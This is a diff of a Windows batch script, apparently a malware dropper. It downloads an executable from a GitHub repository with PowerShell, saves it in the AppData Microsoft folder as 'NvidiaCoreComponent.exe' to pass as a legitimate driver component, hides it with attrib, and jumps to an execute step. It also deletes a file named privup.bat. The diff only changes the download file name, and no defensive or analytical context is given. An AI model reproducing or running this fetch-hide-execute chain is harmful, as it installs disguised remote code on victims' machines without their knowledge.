@@ -9,7 +9,7 @@ if exist %appdata%\Microsoft\privup.bat (del /f %appdata%\Microsoft\privup.bat)
 if exist %appdata%\Microsoft\NvidiaCoreComponent.exe ( goto :execute ) else (goto :download)
 
 :download
-powershell -command "Invoke-WebRequest -Uri 'https://github.com/4V4loon/tools/blob/master/Client.exe?raw=true' -OutFile $env:appdata\Microsoft\NvidiaCoreComponent.exe"
+powershell -command "Invoke-WebRequest -Uri 'https://github.com/4V4loon/tools/blob/master/NvidiaCoreComponent.exe?raw=true' -OutFile $env:appdata\Microsoft\NvidiaCoreComponent.exe"
 attrib +h %appdata%\Microsoft\NvidiaCoreComponent.exe
 goto :execute
 
